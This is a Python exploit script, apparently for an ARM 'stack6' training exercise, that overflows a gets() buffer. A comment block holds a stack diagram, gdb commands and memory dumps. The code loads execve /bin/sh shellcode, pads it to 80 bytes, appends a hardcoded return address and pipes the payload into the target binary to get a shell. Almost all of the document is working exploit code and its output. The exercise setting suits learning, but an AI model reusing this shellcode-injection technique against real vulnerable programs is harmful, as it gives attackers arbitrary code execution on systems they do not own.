#!/usr/bin/python3
from subprocess import Popen, PIPE
import shlex
import struct

'''
	+----------+
	| A A A A  |  <=== FP-80 [ACID] : gets(FP-80) 
	+----------+-\
	   ...       |
	    ...      | 80 bytes in between
	     ...     |
	+----------+ |
	| saved FP | |
	+----------+-/
	| saved LR |  <--- FP 
	+----------+

# stack segment is RWX
$ readelf -l ./stack5 | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

$ gdb
(gdb) disass getpath
(gdb) b *getpath+48
(gdb) r <<< $(python -c "print('A'*80 + 'BBBB')")

STACK state before ACID rain
(gdb) x/18xw $fp-68
0xbefff1e8:     0x00000003      0xb6e77be8      0x00000000      0xb6e779f8
0xbefff1f8:     0xbefff230      0xb6fd618c      0x00000000      0x00000000
0xbefff208:     0x000103e4      0x00010498      0xb6fb2ba0      0x00010448
0xbefff218:     0x00000000      0x000102f4      0x00000000      0x00000000
0xbefff228:     0x00000000      0xb6e8c294

STACK state after ACID rain
(gdb) x/18xw $fp-68
0xbefff1e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff208:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff218:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff228:     0x41414141      0x0001044c

'''

raw_shellcode_file = "./shellcode/execve_binsh.raw"
target = "./stack6"

# read shellcode from file
fo = open (raw_shellcode_file, 'rb')
shellcode = fo.read()
fo.close()

# create NOP sled
nopSled = struct.pack("<I", 0xe1a04004)		# NOP : mov r4, r4

# craft payload
payload = bytearray()
payload += bytearray(shellcode)
for i in range(0, 80-len(payload)):
	payload.append(0xf + i)
payload += struct.pack('<I', 0xbefff1d0)

# write payload to disk (for manual exploitation)
fo = open(target + '.input', 'wb')
fo.write(payload)
fo.close()

p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload)
p.stdin.flush()				# send payload to target process
